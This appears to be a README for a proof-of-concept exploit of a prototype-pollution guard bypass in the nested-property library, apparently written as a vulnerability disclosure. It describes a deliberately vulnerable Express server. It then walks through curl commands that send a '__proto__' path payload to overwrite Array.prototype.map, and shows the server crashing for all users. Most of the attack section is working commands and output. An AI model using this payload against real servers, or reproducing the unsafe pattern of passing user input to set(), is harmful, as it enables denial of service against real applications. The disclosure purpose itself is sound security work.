# Nested-Property Exploitation Demo

This directory contains a vulnerable Express.js server designed to demonstrate how the `nested-property` (v4.0.0) bypass can be exploited in a realistic application context.

## The Scenario

The `server.js` file simulates a generic application with two endpoints:
1. `POST /api/users/:username/settings`: A user profile update endpoint that takes user-controlled JSON and passes it directly to `nested-property.set()`.
2. `GET /api/health`: A simple benign endpoint that checks database logs and maps them using `Array.prototype.map()`.

## Executing the Denial of Service (DoS)

First, start the server:
```bash
npm install
npm start
```

### 1. Verify Normal Operation
Before the attack, the health check works perfectly:
```bash
curl http://localhost:3000/api/health
```
**Output:**
```json
{"status":"Healthy","logs":["[LOG] Server started","[LOG] Connected to DB"]}
```

### 2. Send the Malicious Payload
The attacker sends a malicious JSON payload to the settings endpoint. Since the `alice` object has a `tags` array, we traverse through it to reach `Array.prototype`.

```bash
curl -X POST http://localhost:3000/api/users/alice/settings \
  -H "Content-Type: application/json" \
  -d '{"path": "tags.__proto__.map", "value": "CRASH"}'
```
**Output:**
```json
{"success":true,"message":"Settings updated","settings":{"theme":"light"}}
```
Notice that the server returns a 200 OK! The guard in v4.0.0 did not block this because we mutated `Array.prototype`, not `Object.prototype`.

### 3. Trigger the Crash Globally
The `Array.prototype.map` function has now been overwritten with the string `"CRASH"` process-wide. If anyone (including normal users) accesses an endpoint that uses `.map()`, it will immediately fail.

```bash
curl http://localhost:3000/api/health
```
**Output:**
```json
{"error":"Server Error: db.systemLogs.map is not a function"}
```

**The server is now globally compromised.** Any operation relying on array mapping is broken until the server is physically restarted. This is the catastrophic nature of the bypass.
